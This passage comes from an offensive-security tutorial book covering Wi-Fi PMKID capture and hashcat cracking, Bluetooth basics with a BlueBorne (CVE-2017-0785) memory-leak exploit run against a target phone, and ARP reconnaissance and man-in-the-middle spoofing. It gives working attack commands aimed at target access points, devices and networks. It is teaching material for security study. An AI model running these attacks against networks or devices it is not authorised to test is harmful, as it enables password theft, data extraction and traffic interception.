The script will then send deauth frames to the AP every 60 seconds for 5000 iterations or about three
days! Of course, for shorter or longer periods of time, simply adjust the second number in the for clause
(5000).

PMKID Attack

In August 2018, the developers of hashcat announced they had found a new attack against WPA2-
PSK.  As we saw above, the cracking of WPA2-PSK involves temporarily disconnecting a client from the
AP in order to get them to re-connect, where we then capture the hash in the 4-way handshake. The good
folks at hashcat found that they could get the password hash without the need for a client to connect,
saving us one step and significant time and trouble.

The PMKID attack is capable of getting the information for the WPA2-PSK brute-force password attack
by grabbing a single frame. That frame, the RSN IE, contains all the information we need, and it doesn’t
require a client to connect!

How It Works

When your wireless network adapter starts up, your system begins to look for known networks to connect
to. It ”probes” for known SSID’s to connect to.  If the AP is in range, the AP will respond to the probe.
The AP response is the RSN (Robust Security Network).  Your network adapter then responds with an
Authentication Request (AR). The Authentication Request prompts the AP to send its own authentication
frames. When the Wi-Fi adapter receives this authentication request, it will send an Association Request
to the AP with ESSID and RSN. The AP responds with an EAPOL frame that may contain the PMKID.
This PMKID contains:

1. PMK
2. PMK Name
3. AP’s MAC Address
4. Stations MAC Address

All this information is then hashed through the HMAC-SHA1-128 algorithm. This attack is successful by
grabbing the PMKID, stripping out all the information but the password hash, and then running that hash
through a hash cracker, such as hashcat.

Let’s get started!

The tools we need for this attack are not built into Kali by default, so we will need to download them
from github and build them.

First, we need the hcxdumptool. Using git clone, we can download it from www. github.com by
entering;

kali > git clone https://github.com/ZerBea/hcxdumptool.git

93 | P a g e

Then, navigate to the new hcxdumptool directory;

kali > cd hcxdumptool

kali >make

kali >make install

..and make and install this tool.

Next, we need the hcxtools. Just like the hcxdumptool above, we can download and install it by
entering;

kali >git clone https://github.com/ZerBea/hcxtools.git

kali >cd hcxtools

kali >make

kali >make install

94 | P a g e

We now need to place our wireless adapter into monitor mode again.

kali >airmon-ng start wlan0

With the wireless adapter in monitor mode, we can now probe the available APs for their PMKID.

kali >hcxdumptool –I wlan0mon –o HackersArisePMKID –enable_status=1

As you can see above, hcxdumptool is capable of pulling the PMKID from many of the Wi-Fi APs in the
area. It likely won’t be able to pull all of them, but it usually can pull most of them (80-90 percent).

Note that our capture file has multiple PMKID’s. It’s likely we only want to crack the PSK of one AP. To
do so, let’s run the hcxdumptool with a filter for just a single target AP. Go back to our airodump-
ng terminal and select the BSSID of the target AP. Then create a simple text file with the BSSID of the
target AP. We can use cat to create a simple text file named “targetBSSID’.

Make certain that the file does not contain any colons “:” or spaces.

kali > cat > targetBSSID <the target AP’s BSSID>

Exit cat by entering CTRL+D.

Now that we have the BSSID in a plain text file, we can use it in hcxdumptool filter for that target AP
and place the target’s  PMKID into our output file.

To do so, enter:

kali > hcxdumptool –I wlan0mon –o HackersArisePMKID –enable_status=1 –
filterlist_ap=targetBSSID –filtermode=2

95 | P a g e

As you can see above, hcxdumptool focused on that one AP and placed the PMKID into our file
“HackersArisePMKID”!

Convert Dump to Hashcat Format

To convert the HackersArisePMKID file into a format that hashcat can work with, we need to use
the hcxcaptool. Make certain you are in the same directory as the HackersArisePMKID file and
enter:

kali > hcxcaptool –z hashoutput.txt HackersArisePMKID

Now that we have stripped out all the superfluous information, we can send this hashoutput.txt file
to hashcat and crack it! Note the –m 16800 in this command represents the appropriate hash
algorithm for this hash.

kali > hashcat –m 16800 hashoutput.txt top10000passwords.txt

Summary

96 | P a g e

Wi-Fi or IEEE 802.11 is still fertile ground for hacking after twenty years of patching and security
upgrades. It’s critical that the attacker selects the proper strategy to be successful and not waste their time
and resources. The WPA2-PSK attacks using the 4-way handshake, or PMKID can be very time-
consuming. If the AP has WPS enabled, this attack by bully or REAVER can take just a few hours (it
only requires 11,000 attempts). If all you need is to eavesdrop on the target’s Wi-Fi traffic, the Evil Twin
attack can be very effective.

Exercises:

1. Use iwconfig to view all your wireless connections
2. Use airmon-ng to place your wi-fi adapter into monitor mode
3. Use airodump-ng to find all the APs and clients in your range
4. Use ireshark to filter out any traffic not coming from your wi-fi connection
5. Use wash to find any devices using WPS in your range

97 | P a g e

Chapter 6
Bluetooth Networks

Today, Bluetooth is built into nearly all our gadgets.
These include our computers, smartphones, iPods,

tablets, speakers, game controllers, and many other

devices. In this series, we will be focused on mobile
hacking devices, tablets, and phones, as they are the
most fertile ground for hackers. The ability to hack
Bluetooth can lead to the compromise of any information
on the device (pictures, emails, text, etc.), control of the

device, and the ability to send unwanted info to the device.

98 | P a g e

Before we start hacking Bluetooth, though, we need to understand the technology, the terms, and the
security that is built into Bluetooth if we want to hack it successfully. In a short article like this, I
can't convey an in-depth understanding of Bluetooth, but I do think I can give you the basic
knowledge that you can use in subsequent tutorials/hacks.

Bluetooth Basics

Bluetooth is a universal protocol for low-power, near-field communication operating at 2.4 - 2.485
GHz using spread spectrum, frequency hopping at 1,600 hops per second (this frequency hopping is a
security measure). It was developed in 1994 by Ericsson Corp. of Sweden and named after the 10th-
century Danish (Sweden and Denmark were a single country in the 10th century) King Harald
Bluetooth.

The minimum specification for Bluetooth range is 10 meters, but there is no limit to the range that
manufacturers may implement in their devices. Many devices have a range as long as 100 meters.
With special antennas, we can extend the range even further.

When two Bluetooth devices connect, this is referred to as pairing. Nearly any two Bluetooth devices
can connect to each other. Any discoverable Bluetooth device transmits the following information:

 Name
 Class
 List of services
 Technical information

When the two devices pair, each exchanges a pre-shared secret or link key. Each stores this link key
to identifying the other in any future pairing.

Every device has a unique 48-bit identifier (a MAC-like address) and usually a manufacturer-
assigned name.

Here is a diagram of the Bluetooth pairing process. Although much more secure in recent years, it is
still vulnerable, as we will see in future tutorials in this series.

99 | P a g e

100 | P a g e

Bluetooth devices create what is called a piconet or very small net. In a piconet, there is one master
and up to seven active slaves. Because Bluetooth uses frequency hopping (frequencies change 1,600
times per second), these devices' communication doesn't interfere with each other, as the chances of
two devices using the same frequency is very small.

Basic Linux Bluetooth Tools

The Linux implementation of the Bluetooth protocol stack is BlueZ. Most Linux distributions have it
installed by default, but if not, you can usually find it in your repository. In our Kali Linux, as you
would expect, it is installed by default.

BlueZ has a number of simple tools we can use to manage and eventually hack Bluetooth. These
include:



hciconfig: This tool operates very similarly to ifconfig in Linux, except that it operates on the
Bluetooth devices. As you can see in the screenshot below, I have used it first to bring up the



 Bluetooth interface (hci0) and second, query the device for its specifics





hcitool: This is an inquiry tool. It can provide us with device name, device ID, device class,
and device clock.
hcidump: This tool enables us to sniff Bluetooth communication.

Bluetooth Protocol Stack

The Bluetooth protocol stack looks like this.

101 | P a g e

Bluetooth devices don't need to use all the protocols in the stack (like the TCP/IP stack). The
Bluetooth stack is developed to enable the use of Bluetooth by a variety of communication
applications. Generally, an application will only use one vertical slice of this stack. The Bluetooth
protocols layer and their associated protocols are listed below.

 Bluetooth Core Protocols Baseband: LMP, L2CAP, SDP
 Cable Replacement Protocol: RFCOMM
 Telephony Control Protocol: TCS Binary, AT-commands
 Adopted Protocols: PPP, UDP/TCP/IP, OBEX, WAP, vCard, vCal, IrMC, WAE

In addition to the protocol layers, the Bluetooth specification also defines a host controller interface
(HCI). This provides a command interface to the baseband controller, link manager, and access to
hardware status and control registers, hence the name of the tools above, such as hciconfig, hcidump,
and hcitool.

Bluetooth Security

Bluetooth security is based on a few techniques. First frequency hopping. Both the master and slave
know the frequency hopping algorithm, but the outsider does not. Second, a pre-shared key is
exchanged at a pairing that is used for authentication and encryption (128-bit).

There are three security modes for Bluetooth. These are:

1. Security Mode 1: No active security.

102 | P a g e

2. Security Mode 2: Service level security. A centralized security manager handles

authentication, configuration, and authorization. May not be activated by a user. No device-
level security.

3. Security Mode 3: Device level security. Authentication and encryption based on the secret

key. Always on. Enforces security for low-level connection.

Bluetooth Hacking Tools in Kali

We have several Bluetooth hacking tools built into Kali that we will be using throughout this series,
as well as others that we will need to download and install. We can find the installed Bluetooth tools
by going to Applications -> Kali Linux -> Wireless Attacks -> Bluetooth Tools.

There, we will find several tools for attacking Bluetooth. Let's take a brief look at each of them.

 Bluelog: A bluetooth site survey tool. It scans the area to find as many discoverable devices

in the area and then logs them to a file.

 Bluemaho: A GUI-based suite of tools for testing the security of Bluetooth devices.
 Blueranger: A simple Python script that uses i2cap pings to locate Bluetooth devices and

determine their approximate distances.

103 | P a g e

 Btscanner: This GUI-based tool scans for discoverable devices within range.
 Redfang: This tool enables us to find hidden Bluetooth device.


Spooftooph: This is a Bluetooth spoofing tool.

Some Bluetooth Attacks

 Blueprinting: The process of footprinting.
 Bluesnarfing: This attack takes data from the Bluetooth-enabled device. This can include

SMS messages, calendar info, images, the phone book, and chats.

 Bluebugging: The attacker can take control of the target's phone. Bloover was developed as a

POC tool for this purpose.

 Bluejacking: The attacker sends a "business card" (text message) that, if the user allows it to
be added to their contact list, enables the attacker to continue to send additional messages.

 Bluesmack: A DoS attack against Bluetooth devices.

Now that we have a basic understanding of Bluetooth terms, technologies, and security, we can begin
to explore ways to break and hack Bluetooth.

When BlueTooth was first introduced in 1994 by Ericcson Corporation of Sweden, it was very
insecure. Hackers could steal information and send unsolicited messages to the unsuspecting.

In recent years, additional security has been built-in into the protocol, and much of the IT
security industry has sat back and said, "It's fixed and unhackable." On the other hand, I maintain
that BlueTooth is and will remain one of the most vulnerable protocols, making all our data on
our BlueTooth-enabled devices vulnerable to being hacked.

The BlueBourne Attack

In recent years, Armis Security has released a number of exploits against unpatched BlueTooth
devices. You can read more about it here. These exploits are capable of attacking iOS (but not
iOS 10), Microsoft Windows, and Android. Nearly every company has issued patches, but for a
number of reasons many Android systems are still unpatched.

The exploit attacks the SDP protocol of the BlueTooth stack (see below). The exploit
masquerades as a BlueTooth device and is able to exploit vulnerabilities in SDP. The BlueTooth
device does not even need to be in discover mode, and it only needs to ON. Since BlueTooth has
access to the inner sanctum of the kernel, nearly everything is vulnerable.

104 | P a g e

In this section, we will look at how to extract data from an unpatched BlueTooth device using the
BlueBorne exploit.

Getting Started

The first step, of course, must be an unpatched device. I will be using an older LG phone I keep
in my lab just for this purpose.

Of course, you will need a BlueTooth adapter to communicate with your target. There are a
number of BlueTooth adapters that are Linux compatible, but I will be using one from Pluggable
that is Plug-n-Play compatible with our Kali Linux operating system.

Next, we need to install the dependencies into our Kali system.

kali > apt-get install bluetooth libbluetooth-dev

kali > pip install pybluez

kali > pip install pwntools

105 | P a g e

Install the Python Script

Although Armis developed these exploits, they have not released them to the public. Fortunately,
a security researcher has developed a python script based on the Armis research. You can find it
at github.com. Simply clone it into your system as below.

kali > git clone https://github.com/ojasookert/CVE-2017-0785

After cloning it, you will see a new directory created, CVE-2017-0785.

Navigate to that directory and do a long listing (ls -l). You will see a README.md file and the
python script CVE-2017-0785.py

kali > cd CVE-2017-0785

You will need to give yourself execute permissions on this script.

kali > chmod 755 CVE-2017-0785.py

Get the MAC address of the Target

Now that we have our dependencies met and installed the Python script, the only left to be done
is to obtain the MAC address of the target system. As I demonstrated above, we can scan for
BlueTooth devices with the hcitool.

106 | P a g e

kali > hcitool scan

This utility will go out and scan for any available BlueTooth devices within range. As you can
see, it found my LG phone. I have obscured the MAC address to protect the innocent.

Execute the BlueBourne Exploit

Now, we have everything we need to exploit the BlueTooth device and extract its memory. To
run the exploit, we simply enter python, the name of the script, and TARGET= followed by the
mac address of the target system.

kali > python CVE-2017-785.py TARGET=<MAC ADDRESS of Target>

The python script has exploited the target and removed the first 30 bytes from memory! Of
course, we can edit the script to extract even more memory.

107 | P a g e

BlueTooth hacking has been a relatively quiet field for a number of years, but I expect it to heat
up now, making all our mobile devices vulnerable.

Exercises

Install Bluez, if it is not already installed on your system

1.
2. Use the hciconfig tool to find the MAC address of your Bluetooth adapter
3. Use hcitool to scan for other Bluetooth devices in your range

108 | P a g e

Chapter 7
Address Resolution Protocol(ARP)

Understanding the many network protocols can
enhance your ability to gain information and access
your target. Address Resolution Protocol (or ARP as it
is commonly known) is used on Ethernet networks to
assign IP addresses to globally unique MAC
addresses. In this way, when a new system enters the

109 | P a g e

network, its MAC address is assigned an IP address within the range of IP addresses on the
network. This is the method that network devices such as gateways, routers, and switches know
which machine has which IP address and can route the traffic destined for that IP address ( a
logical system) to the proper physical machine (MAC or physical address).

If the attacker understands ARP, they can leverage the ARP protocol to find systems on the
network and even imitate and gain access to a particular systems traffic through Man-in-the-
Middle attacks.

How ARP Works

ARP uses a simple message format sent over the link layer and network layer (Layers 2 and 3 of
the OSI model). This message contains one request or one response. For example, assume two
computers on an Ethernet LAN. Computer 1 needs to send a packet to computer 2. Computer 1
knows that Computer 2's IP address is 192.168.1.101. To send the packet to computer 2, it needs
the physical address of computer two or its MAC address.

Computer 1 can find the MAC address of computer two by doing a lookup in the ARP table. The
ARP table is a mapping of known physical addresses to logical addresses (MAC to IP). If
computer 1 finds the MAC address of Computer 2 in the ARP table, it goes ahead and sends the
packet to the MAC address of computer 2. If it doesn't find the corresponding MAC in the ARP
table, it sends out a broadcast ARP request to every computer on the network asking, "Who has
IP address 192.168.1.101?". Computer 2 will then send a unicast (1 to 1) response saying, "I
have 192.168.1.101, and my MAC address is 11:22:33:44:55:66!". Now Computer 1 can send
the packet to MAC address 11:22:33:44:55:66.

The ARP Command

The arp command is found in both Windows and Linux systems. With it, you can discover the
contents of the arp table and even manipulate this table.

In Windows, simply enter;

> arp -a

110 | P a g e

As you can see above, the Windows operating system displays the contents of the arp table. This
table contains the IP address, the Physical or MAC address, and the type (either static or
unchanging and dynamic or changing).

A similar command exists in Linux. Let's look at it next,

Similarly to Windows, when you enter arp -a (all), Linux displays the arp table but without the
designation of static v dynamic.

kali > sudo arp -a

111 | P a g e

When we enter arp with the -v option, Linux displays the same information in a better-formatted
table and includes the flags mask indicating what Class of the IP address is used.

kali > sudo arp -v

ARP Packets in Wireshark

We can view the arp packets in Wireshark by simply entering the word "arp" in the filter window
like below.

When we click on a single packet, we can dissect the packet. Expanding the Address Resolution
Protocol field, we can see the Sender and Target IP and MAC addresses.

112 | P a g e

How Hackers Can Use ARP for Reconnaissance

The ARP protocol has no authentication, so the hacker can easily use this "feature" to discover
all the systems on a network. This can be useful when trying to hack another system on the local
area network (LAN) or when you compromise a single user on the network and want to pivot to
a more valuable target on the network, such as a database server.

There are numerous tools the hacker can use to discover systems on the network. These tools
send out a gratuitous ARP request, and systems respond with their IP address and MAC. For
instance, in our Kali system, we have netdiscover.

To view netdiscover's help screen, simply enter;

kali > sudo netdiscover -h

113 | P a g e

As you can see above, we can use the -r option to scan a range of IP addresses on a network,
such as;

kali > netdiscover -r 192.168.100.0/24

As you can see above, netdiscover enumerates every system on the network with its IP address,
MAC address, and vendor of the network interface (NIC).

ARP Vulnerabilities and Exploitation

ARP can also be used to conduct a Man-in-the-Middle (MiTM) attack. Remember, IP addresses
are assigned to physical interfaces (MAC addresses) via the ARP protocol. Attackers can send
out gratuitous ARP requests to have their computer designated as the location of the specific IP
address the target is trying to reach, thereby placing themselves in the middle between the target
and the intended server. This is known as arpspoofing. In this way, they can eavesdrop on the
target's traffic or even alter it.

114 | P a g e

Ettercap is an easy-to-use arp spoofing tool for MiTM attacks. To learn more about Ettercap,
click here (https://www.hackers-arise.com/post/2017/08/28/MiTM-Attack-with-Ettercap).

Other tools that utilize ARP for MitM attacks include;

1. arpspoof (https://www.hackers-arise.com/post/2017/07/25/man-the-middle-mitm-attack-

with-arpspoofing)

2. driftnet (https://www.hackers-arise.com/post/2017/09/27/MitM-Using-driftnet-to-View-the-

Targets-Graphics-Files)

115 | P a g e

Leveraging ARP in the Metasploit Meterpreter

The Address Resolution Protocol (ARP) can also be leveraged by the Metasploit Meterpreter (for
more on Metasploit, see my book Metasploit Basics for Hackers on Hackers-Arise) to discover
systems to pivot to after exploiting a single system on the network. As you know, once a single
system on the network has been compromised, the attacker can use that system as a foothold in
the network and then work to compromise more important systems on the network, such as the
file server or database server.

The meterpreter has a script and a post-exploitation module that enables the attacker to discover
the other systems on the network by sending out gratuitous ARP requests on the network and
waiting for the responses.

For more on Metasploit for hacking, check out my Metasploit Basics for Hackers series here.

116 | P a g e

Summary

